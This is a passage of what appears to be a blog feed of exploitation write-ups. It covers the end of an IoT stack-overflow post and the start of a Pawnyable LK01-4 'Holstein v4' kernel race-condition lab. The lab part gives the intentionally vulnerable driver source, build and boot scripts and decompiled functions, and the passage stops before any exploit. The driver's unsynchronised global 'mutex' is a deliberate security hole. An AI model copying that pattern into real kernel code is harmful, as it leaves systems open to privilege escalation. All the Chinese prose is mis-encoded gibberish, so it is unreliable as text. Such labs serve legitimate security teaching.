class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸå¼¹shellï¼š<br><img src="/EXP_FILE/cb5d17269d22b79db45038f9f002a06b_MD5.jpeg"></p><h1 id="å››ã€æ‚è°ˆ"><a href="#å››ã€æ‚è°ˆ" class="headerlink" title="å››ã€æ‚è°ˆ"></a>å››ã€æ‚è°ˆ</h1><p>è¿™ä¸ªæ¼æ´æœ¬èº«å¹¶ä¸å¤æ‚ï¼Œåªæ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œä½†æ˜¯åœ¨iotç¯å¢ƒä¸‹åˆæ˜¾å¾—é‚£ä¹ˆä¸ä¼—ä¸åŒã€‚è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦iotæ¼æ´çš„å¤ç°ï¼Œä¹Ÿè¸©äº†ä¸å°‘å‘ï¼Œä¸è¿‡ä»ç„¶æ”¶è·æ»¡æ»¡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> RealWorld </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK01-4 Holstein v4 ç«æ€æ¡ä»¶</title>
      <link href="/2024/02/11/LK01-4%20Holstein%20v4%20%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6/"/>
      <url>/2024/02/11/LK01-4%20Holstein%20v4%20%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>LKMæºç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Holstein v4 - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"holstein"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token keyword">int</span> mutex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>g_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_open called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>mutex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"resource is busy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"kmalloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                           <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                           <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_read called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"invalid buffer size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_to_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                            <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                            <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_write called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"invalid buffer size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_from_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_close called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  mutex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span>  <span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>   <span class="token punctuation">.</span>read    <span class="token operator">=</span> module_read<span class="token punctuation">,</span>   <span class="token punctuation">.</span>write   <span class="token operator">=</span> module_write<span class="token punctuation">,</span>   <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>   <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to register device\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to add cdev\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefileï¼š</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> vuln.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/buildCFLAGS_vuln.o <span class="token operator">:=</span> -O1<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç‰ˆæœ¬5.16.14</p><h1 id="ä¸€ã€LK01-4-Holstein-v4"><a href="#ä¸€ã€LK01-4-Holstein-v4" class="headerlink" title="ä¸€ã€LK01-4 Holstein v4"></a>ä¸€ã€LK01-4 Holstein v4</h1><h2 id="ä¸€-ç¨‹åºåˆ†æ"><a href="#ä¸€-ç¨‹åºåˆ†æ" class="headerlink" title="(ä¸€)ç¨‹åºåˆ†æ"></a>(ä¸€)ç¨‹åºåˆ†æ</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictinsmod /root/vuln.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/holstein c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> holstein /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Holstein v4 (KL01-4) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> qemu64,+smap,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">2</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€äº†smapã€smepã€kptiã€kaslr<br>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ-smp 2 å°†è™šæ‹Ÿæœºè®¾ç½®ä¸º2æ ¸CPU</p><h3 id="vuln-ko"><a href="#vuln-ko" class="headerlink" title="vuln.ko"></a>vuln.ko</h3><p>ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡æœ‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        No canary found   NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">49</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./vuln.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="module-initialize"><a href="#module-initialize" class="headerlink" title="module_initialize"></a>module_initialize</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"holstein"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2F4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    qword_820 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_311<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;dev&#x2F;holstein</p><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2B1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> mutex<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> mutex <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2C7<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    g_buf <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3520LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>g_buf <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2DA<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯å¤šäº†ä¸€ä¸ªå…¨å±€å˜é‡mutexï¼Œæ¥ä¿è¯åŒä¸€æ—¶åˆ»ç›®æ ‡è®¾å¤‡åªèƒ½è¢«æ‰“å¼€ä¸€æ¬¡</p><h4 id="module-read"><a href="#module-read" class="headerlink" title="module_read"></a>module_read</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_23D<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_26A<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_253<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_281<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token 